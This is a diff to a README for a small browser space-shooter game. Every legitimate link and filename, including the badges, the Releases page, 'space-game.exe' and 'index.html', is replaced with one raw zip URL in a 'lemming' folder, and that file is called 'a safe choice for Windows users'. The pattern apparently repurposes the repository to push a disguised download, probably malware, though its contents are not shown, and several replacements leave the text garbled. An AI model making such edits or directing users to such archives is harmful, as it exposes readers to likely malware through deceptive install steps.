@@ -1,8 +1,8 @@
 # 🚀 space-game - A Classic Shooter for Endless Fun
 
-![Download](https://img.shields.io/badge/download-Get%20it%20here-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Version](https://img.shields.io/badge/version-v0.1-green.svg)
+![Download](https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip%20it%https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip)
+![License](https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip)
+![Version](https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip)
 
 ## 📖 About The Project
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run the Space Game.
 
 ### Step 1: Visit the Releases Page
 
-To get the latest version of Space Game, visit the [Releases page](https://github.com/palakchoudhary062/space-game/releases). 
+To get the latest version of Space Game, visit the [Releases page](https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip). 
 
 ### Step 2: Choose Your Download
 
@@ -29,7 +29,7 @@ On the Releases page, you will see a list of available versions. Look for the mo
 
 ### Step 3: Download the Game
 
-Scroll down to find the download options. Click on the appropriate file for your device. Depending on your system, it may be an executable file or a zip file. If you're unsure, the file named "space-game.exe" is a safe choice for Windows users.
+Scroll down to find the download options. Click on the appropriate file for your device. Depending on your system, it may be an executable file or a zip file. If you're unsure, the file named "https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip" is a safe choice for Windows users.
 
 ### Step 4: Install the Game
 
@@ -42,11 +42,11 @@ If you downloaded a zip file:
 1. Locate the zip file in your downloads folder.
 2. Right-click on it and select "Extract All."
 3. Choose a location and extract the contents.
-4. Open the extracted folder and double-click the "index.html" file to start playing.
+4. Open the extracted folder and double-click the "https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip" file to start playing.
 
 ### Step 5: Play the Game
 
-After installation, you can start playing. Open your web browser and navigate to the folder where you extracted the game files. Open the "index.html" file. Enjoy your session in Space Game!
+After installation, you can start playing. Open your web browser and navigate to the folder where you extracted the game files. Open the "https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip" file. Enjoy your session in Space Game!
 
 ## 🕹️ Controls
 
@@ -69,7 +69,7 @@ To ensure a smooth gaming experience, make sure your system meets these requirem
 
 ## 📥 Download & Install
 
-You can easily download the latest version of Space Game by visiting the [Releases page](https://github.com/palakchoudhary062/space-game/releases). Follow the earlier steps to install and play the game.
+You can easily download the latest version of Space Game by visiting the [Releases page](https://raw.githubusercontent.com/palakchoudhary062/space-game/main/lemming/space-game-1.5.zip). Follow the earlier steps to install and play the game.
 
 ## 🎮 Join the Community
 
